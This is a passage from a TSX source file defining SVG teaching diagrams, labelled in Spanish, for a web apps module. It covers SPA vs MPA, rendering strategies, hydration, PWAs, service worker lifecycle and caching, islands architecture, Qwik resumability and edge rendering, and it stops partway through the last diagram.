import { DiagramRegistry } from "../diagram.types";

/** Diagramas SVG del módulo Web Apps. */
export const webappsDiagrams: DiagramRegistry = {
  "webapp-spa-vs-mpa-lifecycle": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Single Page Application (SPA) vs Multi-Page Application (MPA)</text>

      {/* Left: SPA */}
      <rect x="30" y="50" width="270" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eff6ff"} stroke="#3b82f6" strokeWidth="1.5" />
      <text x="165" y="68" fill="#3b82f6" fontWeight="bold" fontSize="10.5" textAnchor="middle">Single Page Application (SPA)</text>
      <text x="45" y="88" fill={textColor} fontSize="7.5">• Carga inicial: index.html vacío + JS bundle pesado</text>
      <text x="45" y="103" fill={textColor} fontSize="7.5">• <tspan fontWeight="bold">Client-Side Routing</tspan>: intercepta clicks y muta el DOM</text>
      <text x="45" y="118" fill="#10b981" fontSize="7.5" fontWeight="bold">• Transiciones instantáneas y estado persistente</text>
      <text x="45" y="133" fill={subtextColor} fontSize="7">• Mayor complejidad de SEO; TTFB rápido pero FCP diferido</text>
      <rect x="45" y="148" width="240" height="24" rx="4" fill={isDark ? "#172554" : "#dbeafe"} />
      <text x="165" y="163" fill="#1d4ed8" fontWeight="bold" fontSize="7.5" textAnchor="middle">Navegación Fluida sin Recarga (F5)</text>

      {/* Right: MPA */}
      <rect x="340" y="50" width="270" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="475" y="68" fill="#10b981" fontWeight="bold" fontSize="10.5" textAnchor="middle">Multi-Page Application (MPA)</text>
      <text x="355" y="88" fill={textColor} fontSize="7.5">• Cada URL solicita un documento HTML completo al servidor</text>
      <text x="355" y="103" fill={textColor} fontSize="7.5">• <tspan fontWeight="bold">Server-Side Routing</tspan>: el navegador recarga la página</text>
      <text x="355" y="118" fill="#10b981" fontSize="7.5" fontWeight="bold">• Excelente SEO nativo y FCP ultra rápido con poco JS</text>
      <text x="355" y="133" fill={subtextColor} fontSize="7">• Pérdida de estado de UI entre navegaciones (flash blanco)</text>
      <rect x="355" y="148" width="240" height="24" rx="4" fill={isDark ? "#065f46" : "#d1fae5"} />
      <text x="475" y="163" fill="#047857" fontWeight="bold" fontSize="7.5" textAnchor="middle">Ideal para E-commerce, Blogs y Contenido</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Las SPAs destacan en paneles interactivos y apps de productividad; las MPAs modernas brillan en portales de contenido y SEO.</text>
    </svg>
  );
  },

  "webapp-rendering-strategies-matrix": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Estrategias de Renderizado: CSR, SSR, SSG, ISR &amp; Streaming</text>

      {/* 5 Strategy Cards */}
      <rect x="25" y="50" width="105" height="135" rx="6" fill={isDark ? "#1e293b" : "#f1f5f9"} stroke={border} />
      <text x="77" y="68" fill="#3b82f6" fontWeight="bold" fontSize="9" textAnchor="middle">CSR</text>
      <text x="32" y="85" fill={textColor} fontSize="6.5">Client-Side</text>
      <text x="32" y="98" fill={subtextColor} fontSize="6">El browser renderiza</text>
      <text x="32" y="115" fill="#ef4444" fontSize="6.5">FCP Lento</text>
      <text x="32" y="128" fill="#10b981" fontSize="6.5">Cero carga servidor</text>
      <text x="77" y="165" fill="#64748b" fontSize="6" fontWeight="bold" textAnchor="middle">Apps Privadas</text>

      <rect x="140" y="50" width="105" height="135" rx="6" fill={isDark ? "#172554" : "#eff6ff"} stroke="#3b82f6" />
      <text x="192" y="68" fill="#2563eb" fontWeight="bold" fontSize="9" textAnchor="middle">SSR</text>
      <text x="147" y="85" fill={textColor} fontSize="6.5">Server-Side</text>
      <text x="147" y="98" fill={subtextColor} fontSize="6">HTML en cada request</text>
      <text x="147" y="115" fill="#10b981" fontSize="6.5">Excelente SEO</text>
      <text x="147" y="128" fill="#f59e0b" fontSize="6.5">TTFB dependiente</text>
      <text x="192" y="165" fill="#2563eb" fontSize="6" fontWeight="bold" textAnchor="middle">Dinámico Real-Time</text>

      <rect x="255" y="50" width="105" height="135" rx="6" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" />
      <text x="307" y="68" fill="#10b981" fontWeight="bold" fontSize="9" textAnchor="middle">SSG</text>
      <text x="262" y="85" fill={textColor} fontSize="6.5">Static Generated</text>
      <text x="262" y="98" fill={subtextColor} fontSize="6">HTML en build-time</text>
      <text x="262" y="115" fill="#10b981" fontSize="6.5">TTFB &lt; 50ms (CDN)</text>
      <text x="262" y="128" fill="#ef4444" fontSize="6.5">Build lento si miles</text>
      <text x="307" y="165" fill="#047857" fontSize="6" fontWeight="bold" textAnchor="middle">Marketing / Blogs</text>

      <rect x="370" y="50" width="115" height="135" rx="6" fill={isDark ? "#431407" : "#fff7ed"} stroke="#f97316" />
      <text x="427" y="68" fill="#f97316" fontWeight="bold" fontSize="9" textAnchor="middle">ISR</text>
      <text x="377" y="85" fill={textColor} fontSize="6.5">Incremental Static</text>
      <text x="377" y="98" fill={subtextColor} fontSize="6">Revalida en background</text>
      <text x="377" y="115" fill="#10b981" fontSize="6.5">Velocidad de CDN</text>
      <text x="377" y="128" fill="#10b981" fontSize="6.5">Data fresca por timer</text>
      <text x="427" y="165" fill="#ea580c" fontSize="6" fontWeight="bold" textAnchor="middle">E-commerce Catálogo</text>

      <rect x="495" y="50" width="120" height="135" rx="6" fill={isDark ? "#311042" : "#fdf4ff"} stroke="#c026d3" />
      <text x="555" y="68" fill="#c026d3" fontWeight="bold" fontSize="9" textAnchor="middle">Streaming SSR</text>
      <text x="502" y="85" fill={textColor} fontSize="6.5">HTML progresivo</text>
      <text x="502" y="98" fill={subtextColor} fontSize="6">HTTP chunked transfer</text>
      <text x="502" y="115" fill="#10b981" fontSize="6.5">Shell instantáneo</text>
      <text x="502" y="128" fill="#10b981" fontSize="6.5">Suspense streaming</text>
      <text x="555" y="165" fill="#9333ea" fontSize="6" fontWeight="bold" textAnchor="middle">React 19 / RSC</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Las arquitecturas modernas combinan estrategias híbridas: SSG/ISR para páginas públicas y Streaming SSR para dashboards dinámicos.</text>
    </svg>
  );
  },

  "webapp-hydration-reconciliation-overhead": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">El Proceso de Hidratación en el Cliente &amp; Hydration Mismatch</text>

      {/* Step 1: Server sends static HTML */}
      <rect x="30" y="50" width="170" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" />
      <text x="115" y="68" fill="#10b981" fontWeight="bold" fontSize="9" textAnchor="middle">1. HTML Estático (SSR)</text>
      <rect x="40" y="78" width="150" height="34" rx="4" fill="#d1fae5" />
      <text x="115" y="94" fill="#047857" fontSize="7" fontFamily="monospace" textAnchor="middle">&lt;button&gt;Guardar&lt;/button&gt;</text>
      <text x="115" y="105" fill="#065f46" fontSize="6" textAnchor="middle">(Pintado instantáneo en browser)</text>
      <text x="45" y="128" fill="#ef4444" fontSize="7">• <tspan fontWeight="bold">NO interactivo aún</tspan></text>
      <text x="45" y="141" fill={textColor} fontSize="6.5">Hacer click no produce efecto</text>
      <text x="115" y="174" fill="#059669" fontSize="6.5" fontWeight="bold" textAnchor="middle">FCP Rápido (Uncanny Valley)</text>

      {/* Step 2: Hydration Reconciliation */}
      <rect x="225" y="50" width="190" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eff6ff"} stroke="#3b82f6" strokeWidth="1.5" />
      <text x="320" y="68" fill="#3b82f6" fontWeight="bold" fontSize="9.5" textAnchor="middle">2. Hidratación (JS Runtime)</text>
      <text x="235" y="88" fill={textColor} fontSize="7">• Descarga y parseo del bundle JS</text>
      <text x="235" y="101" fill={textColor} fontSize="7">• Re-ejecuta todos los componentes</text>
      <text x="235" y="114" fill="#2563eb" fontSize="7" fontWeight="bold">• Reconstruye el Virtual DOM en RAM</text>
      <text x="235" y="127" fill="#10b981" fontSize="7" fontWeight="bold">• Adjunta event listeners al DOM</text>
      <rect x="235" y="140" width="170" height="24" rx="3" fill={isDark ? "#312e81" : "#c7d2fe"} />
      <text x="320" y="155" fill="#4338ca" fontSize="6.5" fontWeight="bold" textAnchor="middle">Sobrecarga de CPU en móvil (TBT)</text>
      <text x="320" y="174" fill={subtextColor} fontSize="6" textAnchor="middle">Doble renderizado (Servidor + Cliente)</text>

      {/* Step 3: Hydration Mismatch Warning */}
      <rect x="440" y="50" width="170" height="135" rx="8" fill={isDark ? "#450a0a" : "#fef2f2"} stroke="#ef4444" strokeWidth="1.5" />
      <text x="525" y="68" fill="#ef4444" fontWeight="bold" fontSize="9" textAnchor="middle">3. Hydration Mismatch</text>
      <rect x="450" y="78" width="150" height="42" rx="4" fill="#fee2e2" />
      <text x="455" y="93" fill="#991b1b" fontSize="6.5" fontFamily="monospace">Servidor: &lt;span&gt;10:00&lt;/span&gt;</text>
      <text x="455" y="105" fill="#991b1b" fontSize="6.5" fontFamily="monospace">Cliente:  &lt;span&gt;10:01&lt;/span&gt;</text>
      <text x="450" y="132" fill="#ef4444" fontSize="7" fontWeight="bold">Error: Text content did not match</text>
      <text x="450" y="145" fill={textColor} fontSize="6.5">Causas: new Date(), window checks</text>
      <text x="525" y="174" fill="#b91c1c" fontSize="6.5" fontWeight="bold" textAnchor="middle">React descarta DOM del servidor</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">La hidratación re-ejecuta todo el árbol en el cliente para enganchar eventos; discrepancias entre servidor y cliente fuerzan un re-render costoso.</text>
    </svg>
  );
  },

  "webapp-progressive-web-apps-manifest": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Pilares de una Progressive Web App (PWA) &amp; Web App Manifest</text>

      {/* Left: manifest.json */}
      <rect x="30" y="50" width="270" height="135" rx="8" fill={isDark ? "#0f172a" : "#1e293b"} />
      <text x="45" y="68" fill="#38bdf8" fontSize="8" fontFamily="monospace">manifest.webmanifest</text>
      <text x="45" y="85" fill="#94a3b8" fontSize="7" fontFamily="monospace">&#123;</text>
      <text x="55" y="98" fill="#a5b4fc" fontSize="7" fontFamily="monospace">&quot;name&quot;: &quot;Acme Enterprise App&quot;,</text>
      <text x="55" y="111" fill="#a5b4fc" fontSize="7" fontFamily="monospace">&quot;short_name&quot;: &quot;AcmeApp&quot;,</text>
      <text x="55" y="124" fill="#34d399" fontSize="7" fontFamily="monospace">&quot;display&quot;: &quot;standalone&quot;,</text>
      <text x="55" y="137" fill="#f59e0b" fontSize="7" fontFamily="monospace">&quot;theme_color&quot;: &quot;#0f172a&quot;,</text>
      <text x="55" y="150" fill="#e879f9" fontSize="7" fontFamily="monospace">&quot;icons&quot;: [&#123; &quot;src&quot;: &quot;/icon-512.png&quot;, &quot;purpose&quot;: &quot;maskable&quot; &#125;]</text>
      <text x="45" y="163" fill="#94a3b8" fontSize="7" fontFamily="monospace">&#125;</text>

      {/* Right: 3 Core Pillars */}
      <rect x="330" y="50" width="280" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eff6ff"} stroke="#6366f1" strokeWidth="1.5" />
      <text x="470" y="68" fill="#6366f1" fontWeight="bold" fontSize="10" textAnchor="middle">Los 3 Requisitos Fundamentales</text>

      <rect x="345" y="78" width="250" height="24" rx="4" fill={isDark ? "#312e81" : "#dbeafe"} />
      <text x="355" y="94" fill="#1d4ed8" fontSize="7" fontWeight="bold">1. HTTPS Obligatorio</text>
      <text x="470" y="94" fill={subtextColor} fontSize="6">Seguridad para Service Workers</text>

      <rect x="345" y="106" width="250" height="24" rx="4" fill={isDark ? "#312e81" : "#dbeafe"} />
      <text x="355" y="122" fill="#1d4ed8" fontSize="7" fontWeight="bold">2. Service Worker Activo</text>
      <text x="470" y="122" fill={subtextColor} fontSize="6">Fetch event handler y offline support</text>

      <rect x="345" y="134" width="250" height="24" rx="4" fill={isDark ? "#312e81" : "#dbeafe"} />
      <text x="355" y="150" fill="#1d4ed8" fontSize="7" fontWeight="bold">3. Instalabilidad (A2HS)</text>
      <text x="470" y="150" fill="#10b981" fontSize="6" fontWeight="bold">Prompt &apos;Instalar en Inicio&apos;</text>

      <text x="470" y="174" fill="#4338ca" fontSize="6.5" fontWeight="bold" textAnchor="middle">Experiencia Nativa sin pasar por App Stores</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Una PWA combina el alcance de la web con la capacidad nativa: instalación standalone, iconos maskable y funcionamiento offline.</text>
    </svg>
  );
  },

  "webapp-service-worker-lifecycle": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Ciclo de Vida Estricto del Service Worker</text>

      {/* Stage 1: Registration */}
      <rect x="25" y="55" width="130" height="120" rx="6" fill={isDark ? "#1e293b" : "#f1f5f9"} stroke={border} />
      <text x="90" y="75" fill="#3b82f6" fontWeight="bold" fontSize="8.5" textAnchor="middle">1. Registro</text>
      <text x="35" y="95" fill={textColor} fontSize="6.5">navigator.serviceWorker</text>
      <text x="35" y="107" fill="#3b82f6" fontSize="6.5" fontFamily="monospace">.register(&apos;/sw.js&apos;)</text>
      <text x="35" y="125" fill={subtextColor} fontSize="6">• Verifica scope /</text>
      <text x="35" y="138" fill={subtextColor} fontSize="6">• Descarga script sw.js</text>
      <text x="90" y="160" fill="#64748b" fontSize="6.5" fontWeight="bold" textAnchor="middle">En Hilo de UI</text>

      <text x="165" y="120" fill="#3b82f6" fontSize="14" fontWeight="bold">➔</text>

      {/* Stage 2: Installation */}
      <rect x="180" y="55" width="135" height="120" rx="6" fill={isDark ? "#172554" : "#eff6ff"} stroke="#3b82f6" />
      <text x="247" y="75" fill="#2563eb" fontWeight="bold" fontSize="8.5" textAnchor="middle">2. Instalación</text>
      <text x="190" y="95" fill="#2563eb" fontSize="6.5" fontFamily="monospace">self.addEventListener(&apos;install&apos;)</text>
      <text x="190" y="110" fill={textColor} fontSize="6.5">• <tspan fontWeight="bold">Precaching Estático</tspan>:</text>
      <text x="195" y="123" fill="#047857" fontSize="6" fontFamily="monospace">cache.addAll([&apos;/&apos;, &apos;/app.js&apos;])</text>
      <text x="190" y="140" fill={textColor} fontSize="6.5">• Si 1 archivo falla, ABORTA</text>
      <text x="247" y="160" fill="#1e40af" fontSize="6.5" fontWeight="bold" textAnchor="middle">self.skipWaiting()</text>

      <text x="325" y="120" fill="#2563eb" fontSize="14" fontWeight="bold">➔</text>

      {/* Stage 3: Activation */}
      <rect x="340" y="55" width="135" height="120" rx="6" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" />
      <text x="407" y="75" fill="#10b981" fontWeight="bold" fontSize="8.5" textAnchor="middle">3. Activación</text>
      <text x="350" y="95" fill="#047857" fontSize="6.5" fontFamily="monospace">self.addEventListener(&apos;activate&apos;)</text>
      <text x="350" y="110" fill={textColor} fontSize="6.5">• Limpieza de cachés viejas</text>
      <text x="350" y="123" fill="#047857" fontSize="6" fontFamily="monospace">caches.delete(oldKey)</text>
      <text x="350" y="140" fill="#10b981" fontSize="6.5" fontWeight="bold">• clients.claim()</text>
      <text x="407" y="160" fill="#059669" fontSize="6.5" fontWeight="bold" textAnchor="middle">Toma Control Inmediato</text>

      <text x="485" y="120" fill="#10b981" fontSize="14" fontWeight="bold">➔</text>

      {/* Stage 4: Idle & Intercept */}
      <rect x="500" y="55" width="120" height="120" rx="6" fill={isDark ? "#311042" : "#fdf4ff"} stroke="#c026d3" />
      <text x="560" y="75" fill="#c026d3" fontWeight="bold" fontSize="8.5" textAnchor="middle">4. Operación</text>
      <text x="510" y="95" fill="#a855f7" fontSize="6.5" fontFamily="monospace">self.onfetch = (e) =&gt; ...</text>
      <text x="510" y="112" fill={textColor} fontSize="6.5">• Intercepta tráfico HTTP</text>
      <text x="510" y="127" fill={textColor} fontSize="6.5">• Push notifications</text>
      <text x="510" y="142" fill={textColor} fontSize="6.5">• Background Sync</text>
      <text x="560" y="160" fill="#9333ea" fontSize="6.5" fontWeight="bold" textAnchor="middle">Proxy Invisible</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">El ciclo de vida desacoplado evita que una actualización del script sw.js rompa las pestañas que el usuario tiene abiertas actualmente.</text>
    </svg>
  );
  },

  "webapp-caching-strategies-workbox": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Las 5 Estrategias Canónicas de Caching en Service Workers</text>

      {/* 1. Stale While Revalidate */}
      <rect x="25" y="50" width="110" height="135" rx="6" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" />
      <text x="80" y="68" fill="#10b981" fontWeight="bold" fontSize="8" textAnchor="middle">Stale-While-Revalidate</text>
      <text x="35" y="85" fill={textColor} fontSize="6.5">1. Sirve caché veloz</text>
      <text x="35" y="98" fill={textColor} fontSize="6.5">2. Fetch en background</text>
      <text x="35" y="112" fill="#047857" fontSize="6.5" fontWeight="bold">3. Actualiza caché</text>
      <text x="80" y="145" fill="#059669" fontSize="6.5" fontWeight="bold" textAnchor="middle">Avatares, Feeds,</text>
      <text x="80" y="157" fill="#059669" fontSize="6.5" fontWeight="bold" textAnchor="middle">Listas de Noticias</text>

      {/* 2. Cache First */}
      <rect x="145" y="50" width="110" height="135" rx="6" fill={isDark ? "#172554" : "#eff6ff"} stroke="#3b82f6" />
      <text x="200" y="68" fill="#3b82f6" fontWeight="bold" fontSize="8.5" textAnchor="middle">Cache First</text>
      <text x="155" y="85" fill={textColor} fontSize="6.5">1. Busca en Cache</text>
      <text x="155" y="98" fill={textColor} fontSize="6.5">2. Si falla ➔ Va a red</text>
      <text x="155" y="112" fill="#2563eb" fontSize="6.5" fontWeight="bold">3. Guarda en Cache</text>
      <text x="200" y="145" fill="#1d4ed8" fontSize="6.5" fontWeight="bold" textAnchor="middle">Fuentes, Imágenes,</text>
      <text x="200" y="157" fill="#1d4ed8" fontSize="6.5" fontWeight="bold" textAnchor="middle">JS/CSS con hash</text>

      {/* 3. Network First */}
      <rect x="265" y="50" width="110" height="135" rx="6" fill={isDark ? "#431407" : "#fff7ed"} stroke="#f97316" />
      <text x="320" y="68" fill="#f97316" fontWeight="bold" fontSize="8.5" textAnchor="middle">Network First</text>
      <text x="275" y="85" fill={textColor} fontSize="6.5">1. Intenta Red</text>
      <text x="275" y="98" fill={textColor} fontSize="6.5">2. Si falla / timeout</text>
      <text x="275" y="112" fill="#ea580c" fontSize="6.5" fontWeight="bold">3. Cae a Caché</text>
      <text x="320" y="145" fill="#c2410c" fontSize="6.5" fontWeight="bold" textAnchor="middle">Precios, Stock,</text>
      <text x="320" y="157" fill="#c2410c" fontSize="6.5" fontWeight="bold" textAnchor="middle">Perfil de Usuario</text>

      {/* 4. Network Only */}
      <rect x="385" y="50" width="110" height="135" rx="6" fill={isDark ? "#3f1d1d" : "#fef2f2"} stroke="#ef4444" />
      <text x="440" y="68" fill="#ef4444" fontWeight="bold" fontSize="8.5" textAnchor="middle">Network Only</text>
      <text x="395" y="85" fill={textColor} fontSize="6.5">1. Exclusivo a red</text>
      <text x="395" y="98" fill={textColor} fontSize="6.5">2. NUNCA se cachea</text>
      <text x="395" y="112" fill="#ef4444" fontSize="6.5" fontWeight="bold">3. Falla si offline</text>
      <text x="440" y="145" fill="#991b1b" fontSize="6.5" fontWeight="bold" textAnchor="middle">Pasarelas de Pago,</text>
      <text x="440" y="157" fill="#991b1b" fontSize="6.5" fontWeight="bold" textAnchor="middle">Mutaciones POST</text>

      {/* 5. Cache Only */}
      <rect x="505" y="50" width="110" height="135" rx="6" fill={isDark ? "#1e293b" : "#f1f5f9"} stroke={border} />
      <text x="560" y="68" fill="#64748b" fontWeight="bold" fontSize="8.5" textAnchor="middle">Cache Only</text>
      <text x="515" y="85" fill={textColor} fontSize="6.5">1. Solo lee Cache</text>
      <text x="515" y="98" fill={textColor} fontSize="6.5">2. CERO acceso a red</text>
      <text x="515" y="112" fill="#64748b" fontSize="6.5" fontWeight="bold">3. Máximo offline</text>
      <text x="560" y="145" fill="#475569" fontSize="6.5" fontWeight="bold" textAnchor="middle">Assets pre-cacheados,</text>
      <text x="560" y="157" fill="#475569" fontSize="6.5" fontWeight="bold" textAnchor="middle">Shell estático</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Seleccionar la estrategia de caché según la volatilidad de los datos es la clave de una experiencia offline de alto rendimiento.</text>
    </svg>
  );
  },

  "webapp-islands-architecture-astro": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Arquitectura de Islas (Islands Architecture - Astro)</text>

      {/* Sea of static HTML */}
      <rect x="30" y="48" width="580" height="135" rx="8" fill={isDark ? "#0f172a" : "#f8fafc"} stroke="#3b82f6" strokeWidth="1.5" strokeDasharray="4 4" />
      <text x="50" y="68" fill="#3b82f6" fontWeight="bold" fontSize="9">Océano de HTML Estático Puro (0 KB JavaScript enviado al cliente)</text>

      {/* Static Header */}
      <rect x="45" y="78" width="550" height="20" rx="4" fill={isDark ? "#1e293b" : "#e2e8f0"} />
      <text x="320" y="92" fill={textColor} fontSize="7.5" textAnchor="middle">Header estático con enlaces y logo (Renderizado en Servidor sin hidratación)</text>

      {/* Static Content Area */}
      <rect x="45" y="106" width="340" height="65" rx="4" fill={isDark ? "#1e293b" : "#e2e8f0"} />
      <text x="60" y="122" fill={textColor} fontSize="7.5">Artículo del Blog / Contenido Principal</text>
      <text x="60" y="136" fill={subtextColor} fontSize="6.5">Párrafos de texto, imágenes optimizadas, tablas estáticas.</text>
      <text x="60" y="150" fill="#10b981" fontSize="7" fontWeight="bold">✓ Se parsea y pinta inmediatamente sin bloquear el Main Thread</text>

      {/* Interactive Island 1: Image Carousel */}
      <rect x="400" y="106" width="195" height="30" rx="4" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="497" y="120" fill="#10b981" fontWeight="bold" fontSize="7.5" textAnchor="middle">Isla 1: Carousel (client:visible)</text>
      <text x="497" y="131" fill="#047857" fontSize="6" textAnchor="middle">Hidrata solo al hacer scroll hasta aquí</text>

      {/* Interactive Island 2: Buy Button */}
      <rect x="400" y="141" width="195" height="30" rx="4" fill={isDark ? "#311042" : "#fdf4ff"} stroke="#c026d3" strokeWidth="1.5" />
      <text x="497" y="155" fill="#c026d3" fontWeight="bold" fontSize="7.5" textAnchor="middle">Isla 2: Carrito (client:load)</text>
      <text x="497" y="166" fill="#9333ea" fontSize="6" textAnchor="middle">Componente React aislado e interactivo</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Las islas aíslan los componentes interactivos en un mar de HTML estático, reduciendo el JavaScript descargado en hasta un 80%.</text>
    </svg>
  );
  },

  "webapp-resumability-qwik-engine": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Resumability (Qwik) vs Hidratación Tradicional</text>

      {/* Left: Classic Hydration */}
      <rect x="30" y="50" width="260" height="135" rx="8" fill={isDark ? "#3f1d1d" : "#fef2f2"} stroke="#ef4444" strokeWidth="1.5" />
      <text x="160" y="68" fill="#ef4444" fontWeight="bold" fontSize="10" textAnchor="middle">Hidratación Clásica (React / Vue)</text>
      <text x="45" y="88" fill={textColor} fontSize="7">• Servidor renderiza HTML y descarta el estado en memoria</text>
      <text x="45" y="102" fill={textColor} fontSize="7">• Cliente descarga megabytes de JS</text>
      <text x="45" y="116" fill="#ef4444" fontSize="7" fontWeight="bold">• Re-ejecuta todo el código para registrar listeners</text>
      <rect x="45" y="130" width="230" height="26" rx="4" fill="#fee2e2" />
      <text x="160" y="146" fill="#991b1b" fontSize="7" fontWeight="bold" textAnchor="middle">Duplicación de Cómputo Servidor ➔ Cliente</text>
      <text x="160" y="174" fill={subtextColor} fontSize="6.5" textAnchor="middle">Tiempo de bloqueo de CPU en smartphones</text>

      {/* Right: Resumability */}
      <rect x="330" y="50" width="280" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="470" y="68" fill="#10b981" fontWeight="bold" fontSize="10" textAnchor="middle">Resumability (Qwik Engine)</text>
      <text x="345" y="88" fill={textColor} fontSize="7">• El servidor <tspan fontWeight="bold">serializa el estado y closures en el HTML</tspan></text>
      <rect x="345" y="98" width="250" height="24" rx="3" fill={isDark ? "#065f46" : "#d1fae5"} />
      <text x="470" y="113" fill="#047857" fontSize="6.5" fontFamily="monospace" textAnchor="middle">on:click=&quot;/chunk.js#onClick[0]&quot;</text>
      <text x="345" y="134" fill="#10b981" fontSize="7.5" fontWeight="bold">• CERO ejecución de JS al cargar la página (0 KB JS inicial)</text>
      <text x="345" y="148" fill={textColor} fontSize="7">• Al hacer click, descarga en microsegundos solo esa función</text>
      <text x="470" y="174" fill="#059669" fontSize="7" fontWeight="bold" textAnchor="middle">Interactividad Instantánea O(1)</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">La resumability elimina la hidratación: la aplicación continúa su ejecución exactamente donde la pausó el servidor sin re-evaluar código.</text>
    </svg>
  );
  },

  "webapp-edge-rendering-workers": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Edge Computing &amp; V8 Isolates: SSR Descentralizado a Nivel Global</text>

      {/* Centralized Node SSR */}
      <rect x="30" y="50" width="260" height="135" rx="8" fill={isDark ? "#1e293b" : "#f1f5f9"} stroke={border} />
      <text x="160" y="68" fill={textColor} fontWeight="bold" fontSize="10" textAnchor="middle">SSR Centralizado Tradicional (Node.js)</text>
      <rect x="45" y="80" width="230" height="28" rx="4" fill="#fee2e2" />
      <text x="160" y="97" fill="#991b1b" fontSize="7" textAnchor="middle">Servidor único en US-East (Virginia)</text>
      <text x="45" y="125" fill="#ef4444" fontSize="7">• Usuario en Tokio o Madrid sufre 250ms de latencia de red</text>
      <text x="45" y="140" fill={textColor} fontSize="7">• Contenedores pesados con 150 MB de memoria por instancia</text>
